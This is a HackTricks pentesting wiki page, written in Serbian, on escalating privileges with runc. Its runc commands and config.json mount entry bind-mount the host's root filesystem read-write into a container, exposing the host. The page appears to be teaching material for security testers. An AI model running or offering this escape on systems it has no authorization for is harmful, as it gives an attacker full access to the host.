# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Ako želite da saznate više o **runc**, pogledajte sledeću stranicu:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ako je `runc` dostupan rootful procesu na hostu, možete koristiti OCI bundle čija konfiguracija mount-a rekurzivno bind-mount-uje hostov `/` na `/` unutar kontejnera, čime se filesystem hosta izlaže u tom mount namespace-u.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Dokumentovani `runc run` workflow koristi rootful režim: runc-ovi sopstveni primeri ga označavaju kao "run as root." Neprivilegovani korisnik zahteva rootless konfiguraciju, kao što je `runc spec --rootless`, a runc dokumentuje da user namespaces moraju biti omogućeni za taj režim.<sup>[[1]](#references)</sup>

## References

- [1] [runc: CLI alat za pokretanje i izvršavanje kontejnera](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI specifikacija runtime-a: Montiranja](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Deljena podstabla](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
